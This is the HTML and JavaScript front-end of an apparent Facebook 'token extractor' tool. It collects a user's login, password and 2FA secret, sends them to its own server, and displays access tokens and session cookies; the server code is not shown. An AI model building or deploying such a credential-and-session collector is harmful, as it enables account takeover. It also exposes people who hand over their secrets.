<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xmarty FB Token Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0f172a; color: #e2e8f0; }
        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .neon-text { text-shadow: 0 0 10px #22d3ee; }
        .input-field { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 12px; width: 100%; outline: none; transition: 0.3s; }
        .input-field:focus { border-color: #22d3ee; box-shadow: 0 0 10px rgba(34, 211, 238, 0.2); }
    </style>
</head>
<body class="p-4 md:p-10">
    <div class="max-w-4xl mx-auto">
        <div class="text-center mb-10">
            <h1 class="text-4xl font-bold neon-text text-cyan-400 mb-2">XMARTY FB TOOL</h1>
            <p class="text-gray-400">Advanced Token Extractor & Encryptor</p>
        </div>

        <div class="grid md:grid-cols-2 gap-8">
            <div class="glass p-6 rounded-2xl">
                <h2 class="text-xl font-semibold mb-6 flex items-center">
                    <span class="mr-2">üîê</span> Login Credentials
                </h2>
                <div class="space-y-4">
                    <input type="text" id="uid" class="input-field" placeholder="Email or Phone Number">
                    <input type="password" id="pwd" class="input-field" placeholder="Password">
                    <input type="text" id="2fa" class="input-field" placeholder="2FA Secret (Optional)">
                    <button onclick="startLogin()" id="loginBtn" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-bold py-3 rounded-lg transition duration-300 shadow-lg shadow-cyan-900/20">
                        GENERATE TOKENS
                    </button>
                </div>
            </div>

            <div class="glass p-6 rounded-2xl flex flex-col">
                <h2 class="text-xl font-semibold mb-6 flex items-center">
                    <span class="mr-2">üìä</span> Results
                </h2>
                <div id="loading" class="hidden text-center py-10">
                    <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-500 mx-auto"></div>
                    <p class="mt-4 text-cyan-400">Processing Request...</p>
                </div>
                <div id="resultArea" class="hidden space-y-4 overflow-y-auto max-h-[400px]">
                    </div>
                <div id="errorArea" class="hidden text-red-400 p-4 bg-red-900/20 rounded-lg"></div>
            </div>
        </div>
    </div>

    <script>
        async function startLogin() {
            const btn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            const resultArea = document.getElementById('resultArea');
            const errorArea = document.getElementById('errorArea');

            // Reset UI
            resultArea.innerHTML = '';
            resultArea.classList.add('hidden');
            errorArea.classList.add('hidden');
            loading.classList.remove('hidden');
            btn.disabled = true;

            const payload = {
                uid: document.getElementById('uid').value,
                password: document.getElementById('pwd').value,
                twofa: document.getElementById('2fa').value
            };

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                const data = await response.json();

                if (data.success) {
                    loading.classList.add('hidden');
                    resultArea.classList.remove('hidden');
                    
                    // Display Main Token
                    addResult('Main Token', data.original_token.access_token);
                    
                    // Display Converted Tokens
                    for (const [app, details] of Object.entries(data.converted_tokens)) {
                        addResult(app, details.access_token);
                    }

                    // Display Cookies
                    addResult('Cookies', data.cookies.string, 'bg-emerald-900/20 text-emerald-400');
                } else {
                    throw new Error(data.error);
                }
            } catch (err) {
                loading.classList.add('hidden');
                errorArea.innerText = "‚ùå " + err.message;
                errorArea.classList.remove('hidden');
            } finally {
                btn.disabled = false;
            }
        }

        function addResult(title, content, customClass = 'bg-slate-800 text-cyan-300') {
            const div = document.createElement('div');
            div.className = `p-3 rounded border border-white/5 text-xs break-all ${customClass}`;
            div.innerHTML = `<strong>${title}:</strong><br>${content}`;
            document.getElementById('resultArea').appendChild(div);
        }
    </script>
</body>
</html>
